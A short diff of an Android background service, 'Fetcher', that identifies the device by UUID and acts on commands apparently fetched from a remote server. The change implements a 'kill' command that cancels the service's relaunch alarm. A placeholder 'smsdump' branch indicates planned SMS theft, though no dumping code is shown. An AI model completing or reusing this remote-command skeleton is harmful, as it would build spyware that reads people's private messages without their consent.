@@ -1,5 +1,7 @@
 package com.app.checker;
 
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -30,7 +32,7 @@ public class Fetcher extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Toast.makeText(getApplicationContext(), "Service successfully invoked", Toast.LENGTH_SHORT).show();;
+        Toast.makeText(getApplicationContext(), "Service successfully invoked", Toast.LENGTH_SHORT).show();
 
         // Check or store UUID to uniquely identify the device
         SharedPreferences sPrefs= PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
@@ -125,7 +127,11 @@ public class Fetcher extends Service {
                     JSONObject json = new JSONObject(result);
                     task = json.getString("message");
                     if(task.equals("kill")){
-                        // Useless as of now because the service gets invoked by AlarmManager
+                        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+                        Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
+                        PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
+                        alarmManager.cancel(pintent);
+                        stopSelf();
                     } else if(task.equals("smsdump")) {
                         // Functions to dump sms
                     } else {
